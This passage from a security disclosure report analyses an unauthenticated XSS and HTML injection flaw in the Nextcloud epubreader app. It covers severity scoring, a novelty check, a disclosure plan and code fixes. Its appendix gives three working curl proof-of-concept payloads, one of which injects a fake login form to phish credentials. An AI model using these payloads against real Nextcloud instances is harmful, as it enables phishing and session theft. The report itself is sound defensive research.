| **Confidentiality impact** | Low — UI spoofing reveals no data directly, but phishing can harvest credentials |
| **Integrity impact** | Low — page content is modified from what the server intended |
| **Availability impact** | None |

**CVSS 3.1 vector:** `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` = **6.1 (Medium)**

If CSP is absent or relaxed (which happens in real deployments):
`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` = **9.3 (Critical)** — full XSS with cookie theft and session hijack.

### Why CSP Mitigation Does Not Disqualify It

Nextcloud has previously issued CVEs for XSS vulnerabilities mitigated by CSP:
- **CVE-2021-32733** (Nextcloud Text app): "A strict Content-Security-Policy disallows execution of inline JavaScript code...however this could be exploited..." — still got a CVE.
- **GHSA-5fpw-795h-rg57** (user_oidc): "The impact is limited by the restrictive CSP" — still got a CVE.

The industry standard is that XSS is a vulnerability regardless of CSP:
- CSP is defense-in-depth, not a fix for XSS
- CSP can be misconfigured, stripped by proxies, or bypassed
- HTML injection without JS execution still enables phishing and UI manipulation
- The root cause (missing output encoding) is a code defect

### Comparison with Existing Nextcloud App CVEs

Similar vulnerabilities that received CVEs:

| CVE | App | Issue | Similarity |
|-----|-----|-------|------------|
| CVE-2021-32733 | Text (core) | XSS via file serving, CSP mitigated | Same: XSS with CSP mitigation |
| CVE-2024-52525 | Server (core) | Sensitive data in memory | Different class |
| CVE-2021-32802 | Cookbook | Workflow injection | Different class |

The epubreader finding is **more severe** than CVE-2021-32733 because it's reachable **without authentication** (the Text app XSS required a logged-in user).

---

## 10. Novelty Check

### Databases Searched

| Source | Query | Result |
|--------|-------|--------|
| NVD (nvd.nist.gov) | "epubreader" | No results |
| GitHub Advisory Database (GHSA) | "e-alfred/epubreader" | No advisories |
| GitHub Issues | `repo:e-alfred/epubreader is:issue XSS OR security OR vulnerability` | 2 results, neither security-related (#5 "Cannot page forward", #10 "Bookmarks not saved") |
| Nextcloud Security Advisories | `nextcloud/security-advisories` GHSA | No epubreader entries |
| HackerOne | Nextcloud program scope | Third-party apps excluded from scope |
| Web search | `"e-alfred/epubreader" security vulnerability XSS print_unescaped` | No matches |
| Web search | `CVE epubreader nextcloud XSS vulnerability GHSA security advisory` | No matches |
| App changelog/commits | `git log -- "*.php"` | No security-related commits |

**Conclusion: This is a novel, unreported vulnerability.**

### Not a Known Issue

- No commit in the app's history addresses this issue
- No `htmlspecialchars()` or `p()` has ever been applied to `$downloadLink` in the template
- The vulnerable pattern has existed since the app's initial template creation
- The developer used `toJson()` (with escaping) for other values but missed `downloadLink`

---

## 11. Other Apps Examined (and Why They Were Ruled Out)

### ransomware_detection v0.9.0 (undo-ransomware/ransomware_detection)

**Examined:** Full audit of 5 controllers, services, and mappers.
**Last commit:** 2020-12-20 (6 years stale)

**Findings:**
- All DB queries are parameterized (no SQLi)
- All service methods pass `$this->userId` to mapper queries with `AND user_id = ?` (no IDOR)
- Templates use Vue.js (`<div id="vue-content"></div>`) — no server-side template injection
- No `@PublicPage` endpoints (all require authentication)
- `@NoCSRFRequired` on all endpoints including state-changing PUT methods — code smell but PUT verb mitigates practical CSRF (requires preflight)
- DI container has wrong import namespace (`Mapper` vs `Db`) — functional bug, not security

**Verdict:** No CVE-qualifying vulnerabilities. The app has good security hygiene despite being unmaintained.

### PhoneTrack v1.6.1 (julien-nc/phonetrack)

**Examined:** Cloned repo, checked commit history and controller structure.
**Last commit:** 2026-11-17 (yesterday!)

**Decision:** Rejected — too actively maintained for the target criteria. Has 6 controllers including `PublicShareController` and `LogController` with `@PublicPage` endpoints, but the recent active development means bugs are likely caught quickly.

### Other candidates considered but not cloned:
- **twofactor_totp** — Only 1 controller (SettingsController), limited attack surface
- **facerecognition** — 8 controllers but relatively recent activity (Aug 2026)
- **ocr** — 2 controllers, mostly translation updates

---

## 12. Disclosure Recommendation

### Recommended Disclosure Path

1. **GitHub Security Advisory (Private):**
   Open a private security advisory at https://github.com/e-alfred/epubreader/security/advisories/new

2. **Nextcloud Security Team:**
   Email security@nextcloud.com with the finding, since the app is distributed via the Nextcloud App Store. They can coordinate with the app maintainer and issue an app store warning if needed.

3. **Timeline:** 90-day coordinated disclosure from initial report.

### Suggested Fix

**Option A — Template fix (minimal change, defense at sink):**

In `templates/epubreader.php`, `templates/cbreader.php`, and `templates/pdfreader.php`, line 31:

```php
// BEFORE (vulnerable):
data-downloadlink='<?php print_unescaped($downloadLink);?>'

// AFTER (fixed):
data-downloadlink='<?php p($downloadLink);?>'
```

**Option B — Controller fix (defense at source, recommended):**

In `lib/Controller/PageController.php`, line 97:

```php
// BEFORE:
'downloadLink' => $this->request->get['file'],

// AFTER:
'downloadLink' => htmlspecialchars($this->request->get['file'], ENT_QUOTES, 'UTF-8'),
```

**Option C — Both (defense in depth, most robust):**
Apply both fixes. The template should use `p()` as a general rule, and the controller should not pass raw user input to templates.

### Additional Recommendations

1. Audit all `print_unescaped()` calls across all templates — the same pattern may exist in other values.
2. Consider using `p()` as the default for all template output and reserving `print_unescaped()` only for values that have been explicitly and verifiably pre-escaped.
3. Consider adding `@BruteForceProtection` to the `@PublicPage` endpoint to rate-limit automated abuse.

---

## Appendix: PoC Requests

### A. Attribute Injection (curl, unauthenticated)
```bash
curl -v 'https://TARGET/apps/epubreader/?type=application/pdf&file=/s/SHARE_TOKEN/download%27%20onmouseover=%27alert(document.domain)%27%20x=%27'
```

### B. HTML Phishing Form Injection (curl, unauthenticated)
```bash
curl -v 'https://TARGET/apps/epubreader/?type=application/pdf&file=/s/SHARE_TOKEN/download%27%3E%3C/head%3E%3Cbody%20style=%27background:white%27%3E%3Ch1%3ESession%20Expired%3C/h1%3E%3Cform%3E%3Cinput%20name=%27user%27%20placeholder=%27Username%27%3E%3Cinput%20name=%27pass%27%20type=%27password%27%20placeholder=%27Password%27%3E%3Cbutton%3ELog%20in%3C/button%3E%3C/form%3E%3Cp%20id=%27'
```

### C. Full-width overlay with onfocus (curl, unauthenticated)
```bash
curl -v 'https://TARGET/apps/epubreader/?type=application/pdf&file=/s/SHARE_TOKEN/download%27%20onfocus=%27alert(1)%27%20autofocus=%27%27%20tabindex=%271%27%20style=%27position:fixed;top:0;left:0;width:100%25;height:100%25;%27%20x=%27'
```

**Prerequisite for all PoCs:** A file on the target instance shared via public link. Replace `SHARE_TOKEN` with the 15-32 character alphanumeric token from the share URL.

---

*Report generated during authorized defensive security research on a local Nextcloud installation. All testing was performed on the researcher's own infrastructure. No third-party or production instances were accessed or attacked.*
